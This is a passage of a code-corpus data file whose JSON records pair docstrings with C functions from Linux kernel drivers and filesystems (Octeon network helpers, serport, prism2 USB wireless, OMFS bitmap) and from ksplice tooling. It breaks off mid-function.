CVMX_BOARD_TYPE_SIM:\n\t\t/* The simulator gives you a simulated 1Gbps full duplex link */\n\t\tresult.s.link_up = 1;\n\t\tresult.s.full_duplex = 1;\n\t\tresult.s.speed = 1000;\n\t\treturn result;\n\tcase CVMX_BOARD_TYPE_EBH3100:\n\tcase CVMX_BOARD_TYPE_CN3010_EVB_HS5:\n\tcase CVMX_BOARD_TYPE_CN3005_EVB_HS5:\n\tcase CVMX_BOARD_TYPE_CN3020_EVB_HS5:\n\t\t/* Port 1 on these boards is always Gigabit */\n\t\tif (ipd_port == 1) {\n\t\t\tresult.s.link_up = 1;\n\t\t\tresult.s.full_duplex = 1;\n\t\t\tresult.s.speed = 1000;\n\t\t\treturn result;\n\t\t}\n\t\t/* Fall through to the generic code below */\n\t\tbreak;\n\tcase CVMX_BOARD_TYPE_CUST_NB5:\n\t\t/* Port 1 on these boards is always Gigabit */\n\t\tif (ipd_port == 1) {\n\t\t\tresult.s.link_up = 1;\n\t\t\tresult.s.full_duplex = 1;\n\t\t\tresult.s.speed = 1000;\n\t\t\treturn result;\n\t\t} else\t\t/* The other port uses a broadcom PHY */\n\t\t\tis_broadcom_phy = 1;\n\t\tbreak;\n\tcase CVMX_BOARD_TYPE_BBGW_REF:\n\t\t/* Port 1 on these boards is always Gigabit */\n\t\tif (ipd_port == 2) {\n\t\t\t/* Port 2 is not hooked up */\n\t\t\tresult.u64 = 0;\n\t\t\treturn result;\n\t\t} else {\n\t\t\t/* Ports 0 and 1 connect to the switch */\n\t\t\tresult.s.link_up = 1;\n\t\t\tresult.s.full_duplex = 1;\n\t\t\tresult.s.speed = 1000;\n\t\t\treturn result;\n\t\t}\n\t\tbreak;\n\t}\n\n\tphy_addr = cvmx_helper_board_get_mii_address(ipd_port);\n\tif (phy_addr != -1) {\n\t\tif (is_broadcom_phy) {\n\t\t\t/*\n\t\t\t * Below we are going to read SMI/MDIO\n\t\t\t * register 0x19 which works on Broadcom\n\t\t\t * parts\n\t\t\t */\n\t\t\tint phy_status =\n\t\t\t    cvmx_mdio_read(phy_addr >> 8, phy_addr & 0xff,\n\t\t\t\t\t   0x19);\n\t\t\tswitch ((phy_status >> 8) & 0x7) {\n\t\t\tcase 0:\n\t\t\t\tresult.u64 = 0;\n\t\t\t\tbreak;\n\t\t\tcase 1:\n\t\t\t\tresult.s.link_up = 1;\n\t\t\t\tresult.s.full_duplex = 0;\n\t\t\t\tresult.s.speed = 10;\n\t\t\t\tbreak;\n\t\t\tcase 2:\n\t\t\t\tresult.s.link_up = 1;\n\t\t\t\tresult.s.full_duplex = 1;\n\t\t\t\tresult.s.speed = 10;\n\t\t\t\tbreak;\n\t\t\tcase 3:\n\t\t\t\tresult.s.link_up = 1;\n\t\t\t\tresult.s.full_duplex = 0;\n\t\t\t\tresult.s.speed = 100;\n\t\t\t\tbreak;\n\t\t\tcase 4:\n\t\t\t\tresult.s.link_up = 1;\n\t\t\t\tresult.s.full_duplex = 1;\n\t\t\t\tresult.s.speed = 100;\n\t\t\t\tbreak;\n\t\t\tcase 5:\n\t\t\t\tresult.s.link_up = 1;\n\t\t\t\tresult.s.full_duplex = 1;\n\t\t\t\tresult.s.speed = 100;\n\t\t\t\tbreak;\n\t\t\tcase 6:\n\t\t\t\tresult.s.link_up = 1;\n\t\t\t\tresult.s.full_duplex = 0;\n\t\t\t\tresult.s.speed = 1000;\n\t\t\t\tbreak;\n\t\t\tcase 7:\n\t\t\t\tresult.s.link_up = 1;\n\t\t\t\tresult.s.full_duplex = 1;\n\t\t\t\tresult.s.speed = 1000;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t} else {\n\t\t\t/*\n\t\t\t * This code assumes we are using a Marvell\n\t\t\t * Gigabit PHY. All the speed information can\n\t\t\t * be read from register 17 in one\n\t\t\t * go. Somebody using a different PHY will\n\t\t\t * need to handle it above in the board\n\t\t\t * specific area.\n\t\t\t */\n\t\t\tint phy_status =\n\t\t\t    cvmx_mdio_read(phy_addr >> 8, phy_addr & 0xff, 17);\n\n\t\t\t/*\n\t\t\t * If the resolve bit 11 isn't set, see if\n\t\t\t * autoneg is turned off (bit 12, reg 0). The\n\t\t\t * resolve bit doesn't get set properly when\n\t\t\t * autoneg is off, so force it.\n\t\t\t */\n\t\t\tif ((phy_status & (1 << 11)) == 0) {\n\t\t\t\tint auto_status =\n\t\t\t\t    cvmx_mdio_read(phy_addr >> 8,\n\t\t\t\t\t\t   phy_addr & 0xff, 0);\n\t\t\t\tif ((auto_status & (1 << 12)) == 0)\n\t\t\t\t\tphy_status |= 1 << 11;\n\t\t\t}\n\n\t\t\t/*\n\t\t\t * Only return a link if the PHY has finished\n\t\t\t * auto negotiation and set the resolved bit\n\t\t\t * (bit 11)\n\t\t\t */\n\t\t\tif (phy_status & (1 << 11)) {\n\t\t\t\tresult.s.link_up = 1;\n\t\t\t\tresult.s.full_duplex = ((phy_status >> 13) & 1);\n\t\t\t\tswitch ((phy_status >> 14) & 3) {\n\t\t\t\tcase 0:\t/* 10 Mbps */\n\t\t\t\t\tresult.s.speed = 10;\n\t\t\t\t\tbreak;\n\t\t\t\tcase 1:\t/* 100 Mbps */\n\t\t\t\t\tresult.s.speed = 100;\n\t\t\t\t\tbreak;\n\t\t\t\tcase 2:\t/* 1 Gbps */\n\t\t\t\t\tresult.s.speed = 1000;\n\t\t\t\t\tbreak;\n\t\t\t\tcase 3:\t/* Illegal */\n\t\t\t\t\tresult.u64 = 0;\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t} else if (OCTEON_IS_MODEL(OCTEON_CN3XXX)\n\t\t   || OCTEON_IS_MODEL(OCTEON_CN58XX)\n\t\t   || OCTEON_IS_MODEL(OCTEON_CN50XX)) {\n\t\t/*\n\t\t * We don't have a PHY address, so attempt to use\n\t\t * in-band status. It is really important that boards\n\t\t * not supporting in-band status never get\n\t\t * here. Reading broken in-band status tends to do bad\n\t\t * things\n\t\t */\n\t\tunion cvmx_gmxx_rxx_rx_inbnd inband_status;\n\t\tint interface = cvmx_helper_get_interface_num(ipd_port);\n\t\tint index = cvmx_helper_get_interface_index_num(ipd_port);\n\t\tinband_status.u64 =\n\t\t    cvmx_read_csr(CVMX_GMXX_RXX_RX_INBND(index, interface));\n\n\t\tresult.s.link_up = inband_status.s.status;\n\t\tresult.s.full_duplex = inband_status.s.duplex;\n\t\tswitch (inband_status.s.speed) {\n\t\tcase 0:\t/* 10 Mbps */\n\t\t\tresult.s.speed = 10;\n\t\t\tbreak;\n\t\tcase 1:\t/* 100 Mbps */\n\t\t\tresult.s.speed = 100;\n\t\t\tbreak;\n\t\tcase 2:\t/* 1 Gbps */\n\t\t\tresult.s.speed = 1000;\n\t\t\tbreak;\n\t\tcase 3:\t/* Illegal */\n\t\t\tresult.u64 = 0;\n\t\t\tbreak;\n\t\t}\n\t} else {\n\t\t/*\n\t\t * We don't have a PHY address and we don't have\n\t\t * in-band status. There is no way to determine the\n\t\t * link speed. Return down assuming this port isn't\n\t\t * wired\n\t\t */\n\t\tresult.u64 = 0;\n\t}\n\n\t/* If link is down, return all fields as zero. */\n\tif (!result.s.link_up)\n\t\tresult.u64 = 0;\n\n\treturn result;\n}", "path": "drivers\\staging\\octeon\\cvmx-helper-board.c", "repo_name": "CyanogenMod/htc-kernel-msm7x30", "stars": 71, "license": "other", "language": "c", "size": 206827}
{"docstring": "/*\n * Callback functions from the serio code.\n */\n", "func_signal": "static int serport_serio_write(struct serio *serio, unsigned char data)", "code": "{\n\tstruct serport *serport = serio->port_data;\n\treturn -(serport->tty->ops->write(serport->tty, &data, 1) != 1);\n}", "path": "drivers\\input\\serio\\serport.c", "repo_name": "CyanogenMod/htc-kernel-msm7x30", "stars": 71, "license": "other", "language": "c", "size": 206827}
{"docstring": "/*----------------------------------------------------------------\n* prism2sta_disconnect_usb\n*\n* Called when a device previously claimed by probe is removed\n* from the USB.\n*\n* Arguments:\n*\tdev\t\tptr to the usb_device struct\n*\tptr\t\tptr returned by probe() when the device\n*                       was claimed.\n*\n* Returns:\n*\tNothing\n*\n* Side effects:\n*\n* Call context:\n*\tprocess\n----------------------------------------------------------------*/\n", "func_signal": "static void prism2sta_disconnect_usb(struct usb_interface *interface)", "code": "{\n\twlandevice_t *wlandev;\n\n\twlandev = (wlandevice_t *) usb_get_intfdata(interface);\n\n\tif (wlandev != NULL) {\n\t\tLIST_HEAD(cleanlist);\n\t\tstruct list_head *entry;\n\t\tstruct list_head *temp;\n\t\tunsigned long flags;\n\n\t\thfa384x_t *hw = wlandev->priv;\n\n\t\tif (!hw)\n\t\t\tgoto exit;\n\n\t\tspin_lock_irqsave(&hw->ctlxq.lock, flags);\n\n\t\tp80211netdev_hwremoved(wlandev);\n\t\tlist_splice_init(&hw->ctlxq.reapable, &cleanlist);\n\t\tlist_splice_init(&hw->ctlxq.completing, &cleanlist);\n\t\tlist_splice_init(&hw->ctlxq.pending, &cleanlist);\n\t\tlist_splice_init(&hw->ctlxq.active, &cleanlist);\n\n\t\tspin_unlock_irqrestore(&hw->ctlxq.lock, flags);\n\n\t\t/* There's no hardware to shutdown, but the driver\n\t\t * might have some tasks or tasklets that must be\n\t\t * stopped before we can tear everything down.\n\t\t */\n\t\tprism2sta_ifstate(wlandev, P80211ENUM_ifstate_disable);\n\n\t\tdel_singleshot_timer_sync(&hw->throttle);\n\t\tdel_singleshot_timer_sync(&hw->reqtimer);\n\t\tdel_singleshot_timer_sync(&hw->resptimer);\n\n\t\t/* Unlink all the URBs. This \"removes the wheels\"\n\t\t * from the entire CTLX handling mechanism.\n\t\t */\n\t\tusb_kill_urb(&hw->rx_urb);\n\t\tusb_kill_urb(&hw->tx_urb);\n\t\tusb_kill_urb(&hw->ctlx_urb);\n\n\t\ttasklet_kill(&hw->completion_bh);\n\t\ttasklet_kill(&hw->reaper_bh);\n\n\t\tflush_scheduled_work();\n\n\t\t/* Now we complete any outstanding commands\n\t\t * and tell everyone who is waiting for their\n\t\t * responses that we have shut down.\n\t\t */\n\t\tlist_for_each(entry, &cleanlist) {\n\t\t\thfa384x_usbctlx_t *ctlx;\n\n\t\t\tctlx = list_entry(entry, hfa384x_usbctlx_t, list);\n\t\t\tcomplete(&ctlx->done);\n\t\t}\n\n\t\t/* Give any outstanding synchronous commands\n\t\t * a chance to complete. All they need to do\n\t\t * is \"wake up\", so that's easy.\n\t\t * (I'd like a better way to do this, really.)\n\t\t */\n\t\tmsleep(100);\n\n\t\t/* Now delete the CTLXs, because no-one else can now. */\n\t\tlist_for_each_safe(entry, temp, &cleanlist) {\n\t\t\thfa384x_usbctlx_t *ctlx;\n\n\t\t\tctlx = list_entry(entry, hfa384x_usbctlx_t, list);\n\t\t\tkfree(ctlx);\n\t\t}\n\n\t\t/* Unhook the wlandev */\n\t\tunregister_wlandev(wlandev);\n\t\twlan_unsetup(wlandev);\n\n\t\tusb_put_dev(hw->usb);\n\n\t\thfa384x_destroy(hw);\n\t\tkfree(hw);\n\n\t\tkfree(wlandev);\n\t}\n\nexit:\n\tusb_set_intfdata(interface, NULL);\n}", "path": "drivers\\staging\\wlan-ng\\prism2usb.c", "repo_name": "CyanogenMod/htc-kernel-msm7x30", "stars": 71, "license": "other", "language": "c", "size": 206827}
{"docstring": "/*\n * serport_ldisc_close() is the opposite of serport_ldisc_open()\n */\n", "func_signal": "static void serport_ldisc_close(struct tty_struct *tty)", "code": "{\n\tstruct serport *serport = (struct serport *) tty->disc_data;\n\n\tkfree(serport);\n}", "path": "drivers\\input\\serio\\serport.c", "repo_name": "CyanogenMod/htc-kernel-msm7x30", "stars": 71, "license": "other", "language": "c", "size": 206827}
{"docstring": "/**\n * This function is called by cvmx_helper_interface_probe() after it\n * determines the number of ports Octeon can support on a specific\n * interface. This function is the per board location to override\n * this value. It is called with the number of ports Octeon might\n * support and should return the number of actual ports on the\n * board.\n *\n * This function must be modifed for every new Octeon board.\n * Internally it uses switch statements based on the cvmx_sysinfo\n * data to determine board types and revisions. It relys on the\n * fact that every Octeon board receives a unique board type\n * enumeration from the bootloader.\n *\n * @interface: Interface to probe\n * @supported_ports:\n *                  Number of ports Octeon supports.\n *\n * Returns Number of ports the actual board supports. Many times this will\n *         simple be \"support_ports\".\n */\n", "func_signal": "int __cvmx_helper_board_interface_probe(int interface, int supported_ports)", "code": "{\n\tswitch (cvmx_sysinfo_get()->board_type) {\n\tcase CVMX_BOARD_TYPE_CN3005_EVB_HS5:\n\t\tif (interface == 0)\n\t\t\treturn 2;\n\t\tbreak;\n\tcase CVMX_BOARD_TYPE_BBGW_REF:\n\t\tif (interface == 0)\n\t\t\treturn 2;\n\t\tbreak;\n\tcase CVMX_BOARD_TYPE_NIC_XLE_4G:\n\t\tif (interface == 0)\n\t\t\treturn 0;\n\t\tbreak;\n\t\t/* The 2nd interface on the EBH5600 is connected to the Marvel switch,\n\t\t   which we don't support. Disable ports connected to it */\n\tcase CVMX_BOARD_TYPE_EBH5600:\n\t\tif (interface == 1)\n\t\t\treturn 0;\n\t\tbreak;\n\t}\n\treturn supported_ports;\n}", "path": "drivers\\staging\\octeon\\cvmx-helper-board.c", "repo_name": "CyanogenMod/htc-kernel-msm7x30", "stars": 71, "license": "other", "language": "c", "size": 206827}
{"docstring": "/*\n * serport_ldisc_open() is the routine that is called upon setting our line\n * discipline on a tty. It prepares the serio struct.\n */\n", "func_signal": "static int serport_ldisc_open(struct tty_struct *tty)", "code": "{\n\tstruct serport *serport;\n\n\tif (!capable(CAP_SYS_ADMIN))\n\t\treturn -EPERM;\n\n\tserport = kzalloc(sizeof(struct serport), GFP_KERNEL);\n\tif (!serport)\n\t\treturn -ENOMEM;\n\n\tserport->tty = tty;\n\tspin_lock_init(&serport->lock);\n\tinit_waitqueue_head(&serport->wait);\n\n\ttty->disc_data = serport;\n\ttty->receive_room = 256;\n\tset_bit(TTY_DO_WRITE_WAKEUP, &tty->flags);\n\n\treturn 0;\n}", "path": "drivers\\input\\serio\\serport.c", "repo_name": "CyanogenMod/htc-kernel-msm7x30", "stars": 71, "license": "other", "language": "c", "size": 206827}
{"docstring": "/**\n * Enable packet input/output from the hardware. This function is\n * called after by cvmx_helper_packet_hardware_enable() to\n * perform board specific initialization. For most boards\n * nothing is needed.\n *\n * @interface: Interface to enable\n *\n * Returns Zero on success, negative on failure\n */\n", "func_signal": "int __cvmx_helper_board_hardware_enable(int interface)", "code": "{\n\tif (cvmx_sysinfo_get()->board_type == CVMX_BOARD_TYPE_CN3005_EVB_HS5) {\n\t\tif (interface == 0) {\n\t\t\t/* Different config for switch port */\n\t\t\tcvmx_write_csr(CVMX_ASXX_TX_CLK_SETX(1, interface), 0);\n\t\t\tcvmx_write_csr(CVMX_ASXX_RX_CLK_SETX(1, interface), 0);\n\t\t\t/*\n\t\t\t * Boards with gigabit WAN ports need a\n\t\t\t * different setting that is compatible with\n\t\t\t * 100 Mbit settings\n\t\t\t */\n\t\t\tcvmx_write_csr(CVMX_ASXX_TX_CLK_SETX(0, interface),\n\t\t\t\t       0xc);\n\t\t\tcvmx_write_csr(CVMX_ASXX_RX_CLK_SETX(0, interface),\n\t\t\t\t       0xc);\n\t\t}\n\t} else if (cvmx_sysinfo_get()->board_type ==\n\t\t   CVMX_BOARD_TYPE_CN3010_EVB_HS5) {\n\t\t/*\n\t\t * Broadcom PHYs require differnet ASX\n\t\t * clocks. Unfortunately many boards don't define a\n\t\t * new board Id and simply mangle the\n\t\t * CN3010_EVB_HS5\n\t\t */\n\t\tif (interface == 0) {\n\t\t\t/*\n\t\t\t * Some boards use a hacked up bootloader that\n\t\t\t * identifies them as CN3010_EVB_HS5\n\t\t\t * evaluation boards.  This leads to all kinds\n\t\t\t * of configuration problems.  Detect one\n\t\t\t * case, and print warning, while trying to do\n\t\t\t * the right thing.\n\t\t\t */\n\t\t\tint phy_addr = cvmx_helper_board_get_mii_address(0);\n\t\t\tif (phy_addr != -1) {\n\t\t\t\tint phy_identifier =\n\t\t\t\t    cvmx_mdio_read(phy_addr >> 8,\n\t\t\t\t\t\t   phy_addr & 0xff, 0x2);\n\t\t\t\t/* Is it a Broadcom PHY? */\n\t\t\t\tif (phy_identifier == 0x0143) {\n\t\t\t\t\tcvmx_dprintf(\"\\n\");\n\t\t\t\t\tcvmx_dprintf(\"ERROR:\\n\");\n\t\t\t\t\tcvmx_dprintf\n\t\t\t\t\t    (\"ERROR: Board type is CVMX_BOARD_TYPE_CN3010_EVB_HS5, but Broadcom PHY found.\\n\");\n\t\t\t\t\tcvmx_dprintf\n\t\t\t\t\t    (\"ERROR: The board type is mis-configured, and software malfunctions are likely.\\n\");\n\t\t\t\t\tcvmx_dprintf\n\t\t\t\t\t    (\"ERROR: All boards require a unique board type to identify them.\\n\");\n\t\t\t\t\tcvmx_dprintf(\"ERROR:\\n\");\n\t\t\t\t\tcvmx_dprintf(\"\\n\");\n\t\t\t\t\tcvmx_wait(1000000000);\n\t\t\t\t\tcvmx_write_csr(CVMX_ASXX_RX_CLK_SETX\n\t\t\t\t\t\t       (0, interface), 5);\n\t\t\t\t\tcvmx_write_csr(CVMX_ASXX_TX_CLK_SETX\n\t\t\t\t\t\t       (0, interface), 5);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\treturn 0;\n}", "path": "drivers\\staging\\octeon\\cvmx-helper-board.c", "repo_name": "CyanogenMod/htc-kernel-msm7x30", "stars": 71, "license": "other", "language": "c", "size": 206827}
{"docstring": "/*\n *  Counts the run of zero bits starting at bit up to max.\n *  It handles the case where a run might spill over a buffer.\n *  Called with bitmap lock.\n */\n", "func_signal": "static int count_run(unsigned long **addr, int nbits,\n\t\tint addrlen, int bit, int max)", "code": "{\n\tint count = 0;\n\tint x;\n\n\tfor (; addrlen > 0; addrlen--, addr++) {\n\t\tx = find_next_bit(*addr, nbits, bit);\n\t\tcount += x - bit;\n\n\t\tif (x < nbits || count > max)\n\t\t\treturn min(count, max);\n\n\t\tbit = 0;\n\t}\n\treturn min(count, max);\n}", "path": "fs\\omfs\\bitmap.c", "repo_name": "CyanogenMod/htc-kernel-msm7x30", "stars": 71, "license": "other", "language": "c", "size": 206827}
{"docstring": "/*----------------------------------------------------------------\n* prism2sta_probe_usb\n*\n* Probe routine called by the USB subsystem.\n*\n* Arguments:\n*\tdev\t\tptr to the usb_device struct\n*\tifnum\t\tinterface number being offered\n*\n* Returns:\n*\tNULL\t\t- we're not claiming the device+interface\n*\tnon-NULL\t- we are claiming the device+interface and\n*\t\t\t  this is a ptr to the data we want back\n*\t\t\t  when disconnect is called.\n*\n* Side effects:\n*\n* Call context:\n*\tI'm not sure, assume it's interrupt.\n*\n----------------------------------------------------------------*/\n", "func_signal": "static int prism2sta_probe_usb(struct usb_interface *interface,\n\t\t\t       const struct usb_device_id *id)", "code": "{\n\tstruct usb_device *dev;\n\n\twlandevice_t *wlandev = NULL;\n\thfa384x_t *hw = NULL;\n\tint result = 0;\n\n\tdev = interface_to_usbdev(interface);\n\twlandev = create_wlan();\n\tif (wlandev == NULL) {\n\t\tprintk(KERN_ERR \"%s: Memory allocation failure.\\n\", dev_info);\n\t\tresult = -EIO;\n\t\tgoto failed;\n\t}\n\thw = wlandev->priv;\n\n\tif (wlan_setup(wlandev) != 0) {\n\t\tprintk(KERN_ERR \"%s: wlan_setup() failed.\\n\", dev_info);\n\t\tresult = -EIO;\n\t\tgoto failed;\n\t}\n\n\t/* Initialize the hw data */\n\thfa384x_create(hw, dev);\n\thw->wlandev = wlandev;\n\n\t/* Register the wlandev, this gets us a name and registers the\n\t * linux netdevice.\n\t */\n\tSET_NETDEV_DEV(wlandev->netdev, &(interface->dev));\n\n\t/* Do a chip-level reset on the MAC */\n\tif (prism2_doreset) {\n\t\tresult = hfa384x_corereset(hw,\n\t\t\t\t\t   prism2_reset_holdtime,\n\t\t\t\t\t   prism2_reset_settletime, 0);\n\t\tif (result != 0) {\n\t\t\tunregister_wlandev(wlandev);\n\t\t\thfa384x_destroy(hw);\n\t\t\tresult = -EIO;\n\t\t\tprintk(KERN_ERR\n\t\t\t       \"%s: hfa384x_corereset() failed.\\n\", dev_info);\n\t\t\tgoto failed;\n\t\t}\n\t}\n\n\tusb_get_dev(dev);\n\n\twlandev->msdstate = WLAN_MSD_HWPRESENT;\n\n\t/* Try and load firmware, then enable card before we register */\n\tprism2_fwtry(dev, wlandev);\n\tprism2sta_ifstate(wlandev, P80211ENUM_ifstate_enable);\n\n\tif (register_wlandev(wlandev) != 0) {\n\t\tprintk(KERN_ERR \"%s: register_wlandev() failed.\\n\", dev_info);\n\t\tresult = -EIO;\n\t\tgoto failed;\n\t}\n\n\tgoto done;\n\nfailed:\n\tkfree(wlandev);\n\tkfree(hw);\n\twlandev = NULL;\n\ndone:\n\tusb_set_intfdata(interface, wlandev);\n\treturn result;\n}", "path": "drivers\\staging\\wlan-ng\\prism2usb.c", "repo_name": "CyanogenMod/htc-kernel-msm7x30", "stars": 71, "license": "other", "language": "c", "size": 206827}
{"docstring": "/*\n * Tries to allocate exactly one block.  Returns true if sucessful.\n */\n", "func_signal": "int omfs_allocate_block(struct super_block *sb, u64 block)", "code": "{\n\tstruct buffer_head *bh;\n\tstruct omfs_sb_info *sbi = OMFS_SB(sb);\n\tint bits_per_entry = 8 * sb->s_blocksize;\n\tunsigned int map, bit;\n\tint ret = 0;\n\tu64 tmp;\n\n\ttmp = block;\n\tbit = do_div(tmp, bits_per_entry);\n\tmap = tmp;\n\n\tmutex_lock(&sbi->s_bitmap_lock);\n\tif (map >= sbi->s_imap_size || test_and_set_bit(bit, sbi->s_imap[map]))\n\t\tgoto out;\n\n\tif (sbi->s_bitmap_ino > 0) {\n\t\tbh = sb_bread(sb, clus_to_blk(sbi, sbi->s_bitmap_ino) + map);\n\t\tif (!bh)\n\t\t\tgoto out;\n\n\t\tset_bit(bit, (unsigned long *)bh->b_data);\n\t\tmark_buffer_dirty(bh);\n\t\tbrelse(bh);\n\t}\n\tret = 1;\nout:\n\tmutex_unlock(&sbi->s_bitmap_lock);\n\treturn ret;\n}", "path": "fs\\omfs\\bitmap.c", "repo_name": "CyanogenMod/htc-kernel-msm7x30", "stars": 71, "license": "other", "language": "c", "size": 206827}
{"docstring": "/*\n * serport_ldisc_receive() is called by the low level tty driver when characters\n * are ready for us. We forward the characters, one by one to the 'interrupt'\n * routine.\n */\n", "func_signal": "static void serport_ldisc_receive(struct tty_struct *tty, const unsigned char *cp, char *fp, int count)", "code": "{\n\tstruct serport *serport = (struct serport*) tty->disc_data;\n\tunsigned long flags;\n\tint i;\n\n\tspin_lock_irqsave(&serport->lock, flags);\n\n\tif (!test_bit(SERPORT_ACTIVE, &serport->flags))\n\t\tgoto out;\n\n\tfor (i = 0; i < count; i++)\n\t\tserio_interrupt(serport->serio, cp[i], 0);\n\nout:\n\tspin_unlock_irqrestore(&serport->lock, flags);\n}", "path": "drivers\\input\\serio\\serport.c", "repo_name": "CyanogenMod/htc-kernel-msm7x30", "stars": 71, "license": "other", "language": "c", "size": 206827}
{"docstring": "/*\n *  Tries to allocate a set of blocks.\tThe request size depends on the\n *  type: for inodes, we must allocate sbi->s_mirrors blocks, and for file\n *  blocks, we try to allocate sbi->s_clustersize, but can always get away\n *  with just one block.\n */\n", "func_signal": "int omfs_allocate_range(struct super_block *sb,\n\t\t\tint min_request,\n\t\t\tint max_request,\n\t\t\tu64 *return_block,\n\t\t\tint *return_size)", "code": "{\n\tstruct omfs_sb_info *sbi = OMFS_SB(sb);\n\tint bits_per_entry = 8 * sb->s_blocksize;\n\tint ret = 0;\n\tint i, run, bit;\n\n\tmutex_lock(&sbi->s_bitmap_lock);\n\tfor (i = 0; i < sbi->s_imap_size; i++) {\n\t\tbit = 0;\n\t\twhile (bit < bits_per_entry) {\n\t\t\tbit = find_next_zero_bit(sbi->s_imap[i], bits_per_entry,\n\t\t\t\tbit);\n\n\t\t\tif (bit == bits_per_entry)\n\t\t\t\tbreak;\n\n\t\t\trun = count_run(&sbi->s_imap[i], bits_per_entry,\n\t\t\t\tsbi->s_imap_size-i, bit, max_request);\n\n\t\t\tif (run >= min_request)\n\t\t\t\tgoto found;\n\t\t\tbit += run;\n\t\t}\n\t}\n\tret = -ENOSPC;\n\tgoto out;\n\nfound:\n\t*return_block = i * bits_per_entry + bit;\n\t*return_size = run;\n\tret = set_run(sb, i, bits_per_entry, bit, run, 1);\n\nout:\n\tmutex_unlock(&sbi->s_bitmap_lock);\n\treturn ret;\n}", "path": "fs\\omfs\\bitmap.c", "repo_name": "CyanogenMod/htc-kernel-msm7x30", "stars": 71, "license": "other", "language": "c", "size": 206827}
{"docstring": "/*\n * serport_ldisc_read() just waits indefinitely if everything goes well.\n * However, when the serio driver closes the serio port, it finishes,\n * returning 0 characters.\n */\n", "func_signal": "static ssize_t serport_ldisc_read(struct tty_struct * tty, struct file * file, unsigned char __user * buf, size_t nr)", "code": "{\n\tstruct serport *serport = (struct serport*) tty->disc_data;\n\tstruct serio *serio;\n\tchar name[64];\n\n\tif (test_and_set_bit(SERPORT_BUSY, &serport->flags))\n\t\treturn -EBUSY;\n\n\tserport->serio = serio = kzalloc(sizeof(struct serio), GFP_KERNEL);\n\tif (!serio)\n\t\treturn -ENOMEM;\n\n\tstrlcpy(serio->name, \"Serial port\", sizeof(serio->name));\n\tsnprintf(serio->phys, sizeof(serio->phys), \"%s/serio0\", tty_name(tty, name));\n\tserio->id = serport->id;\n\tserio->id.type = SERIO_RS232;\n\tserio->write = serport_serio_write;\n\tserio->open = serport_serio_open;\n\tserio->close = serport_serio_close;\n\tserio->port_data = serport;\n\n\tserio_register_port(serport->serio);\n\tprintk(KERN_INFO \"serio: Serial port %s\\n\", tty_name(tty, name));\n\n\twait_event_interruptible(serport->wait, test_bit(SERPORT_DEAD, &serport->flags));\n\tserio_unregister_port(serport->serio);\n\tserport->serio = NULL;\n\n\tclear_bit(SERPORT_DEAD, &serport->flags);\n\tclear_bit(SERPORT_BUSY, &serport->flags);\n\n\treturn 0;\n}", "path": "drivers\\input\\serio\\serport.c", "repo_name": "CyanogenMod/htc-kernel-msm7x30", "stars": 71, "license": "other", "language": "c", "size": 206827}
{"docstring": "/*\n * serport_ldisc_ioctl() allows to set the port protocol, and device ID\n */\n", "func_signal": "static int serport_ldisc_ioctl(struct tty_struct * tty, struct file * file, unsigned int cmd, unsigned long arg)", "code": "{\n\tstruct serport *serport = (struct serport*) tty->disc_data;\n\tunsigned long type;\n\n\tif (cmd == SPIOCSTYPE) {\n\t\tif (get_user(type, (unsigned long __user *) arg))\n\t\t\treturn -EFAULT;\n\n\t\tserport->id.proto = type & 0x000000ff;\n\t\tserport->id.id\t  = (type & 0x0000ff00) >> 8;\n\t\tserport->id.extra = (type & 0x00ff0000) >> 16;\n\n\t\treturn 0;\n\t}\n\n\treturn -EINVAL;\n}", "path": "drivers\\input\\serio\\serport.c", "repo_name": "CyanogenMod/htc-kernel-msm7x30", "stars": 71, "license": "other", "language": "c", "size": 206827}
{"docstring": "/* Returns the span pointed to by the relocation at span->start + offset */\n", "func_signal": "static struct span *span_offset_target_span(struct span *span, int offset)", "code": "{\n\tvoid *entry = span->ss->contents.data + span->start;\n\tarelent *reloc = find_reloc(span->ss, entry + offset);\n\tif (reloc == NULL)\n\t\treturn NULL;\n\treturn reloc_target_span(span->ss, reloc);\n}", "path": "objmanip.c", "repo_name": "jirislaby/ksplice", "stars": 82, "license": "gpl-2.0", "language": "c", "size": 430}
{"docstring": "/* -----------------------------------------------------------------------------\n * gen_operand() - Generates assembly output for each operand.\n * -----------------------------------------------------------------------------\n */\n", "func_signal": "static void \ngen_operand(struct ud* u, struct ud_operand* op)", "code": "{\n  switch(op->type) {\n\tcase UD_OP_REG:\n\t\tmkasm(u, \"%%%s\", ud_reg_tab[op->base - UD_R_AL]);\n\t\tbreak;\n\n\tcase UD_OP_MEM:\n\t\tif (u->br_far) opr_cast(u, op);\n\t\tif (u->pfx_seg)\n\t\t\tmkasm(u, \"%%%s:\", ud_reg_tab[u->pfx_seg - UD_R_AL]);\n\t\tif (op->offset == 8) {\n\t\t\tif (op->lval.sbyte < 0)\n\t\t\t\tmkasm(u, \"-0x%x\", (-op->lval.sbyte) & 0xff);\n\t\t\telse\tmkasm(u, \"0x%x\", op->lval.sbyte);\n\t\t} \n\t\telse if (op->offset == 16) \n\t\t\tmkasm(u, \"0x%x\", op->lval.uword);\n\t\telse if (op->offset == 32) \n\t\t\tmkasm(u, \"0x%lx\", op->lval.udword);\n\t\telse if (op->offset == 64) \n\t\t\tmkasm(u, \"0x\" FMT64 \"x\", op->lval.uqword);\n\n\t\tif (op->base)\n\t\t\tmkasm(u, \"(%%%s\", ud_reg_tab[op->base - UD_R_AL]);\n\t\tif (op->index) {\n\t\t\tif (op->base)\n\t\t\t\tmkasm(u, \",\");\n\t\t\telse mkasm(u, \"(\");\n\t\t\tmkasm(u, \"%%%s\", ud_reg_tab[op->index - UD_R_AL]);\n\t\t}\n\t\tif (op->scale)\n\t\t\tmkasm(u, \",%d\", op->scale);\n\t\tif (op->base || op->index)\n\t\t\tmkasm(u, \")\");\n\t\tbreak;\n\n\tcase UD_OP_IMM:\n\t\tswitch (op->size) {\n\t\t\tcase  8: mkasm(u, \"$0x%x\", op->lval.ubyte);    break;\n\t\t\tcase 16: mkasm(u, \"$0x%x\", op->lval.uword);    break;\n\t\t\tcase 32: mkasm(u, \"$0x%lx\", op->lval.udword);  break;\n\t\t\tcase 64: mkasm(u, \"$0x\" FMT64 \"x\", op->lval.uqword); break;\n\t\t\tdefault: break;\n\t\t}\n\t\tbreak;\n\n\tcase UD_OP_JIMM:\n\t\tswitch (op->size) {\n\t\t\tcase  8:\n\t\t\t\tmkasm(u, \"0x\" FMT64 \"x\", 